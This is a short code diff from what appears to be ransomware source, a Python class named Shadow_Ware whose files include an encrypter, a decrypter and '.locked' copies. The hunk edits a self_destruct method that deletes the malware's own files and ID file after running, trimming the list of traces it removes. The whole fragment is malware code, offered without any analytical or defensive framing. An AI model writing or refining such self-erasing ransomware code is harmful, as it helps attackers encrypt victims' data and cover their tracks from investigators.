@@ -82,11 +82,6 @@ class Shadow_Ware():
 
   def self_destruct(self):
     os.remove(os.path.abspath("ID.id"))
-    os.remove(os.path.abspath("ID.id.locked"))
-    os.remove(os.path.abspath("encrypter.py"))
-    os.remove(os.path.abspath("encrypter.py.locked"))
-    os.remove(os.path.abspath("decrypter.py.locked"))
-    os.remove(os.path.abspath("encry"))
     os.remove(os.path.abspath(__file__))
 
 if __name__ == "__main__":
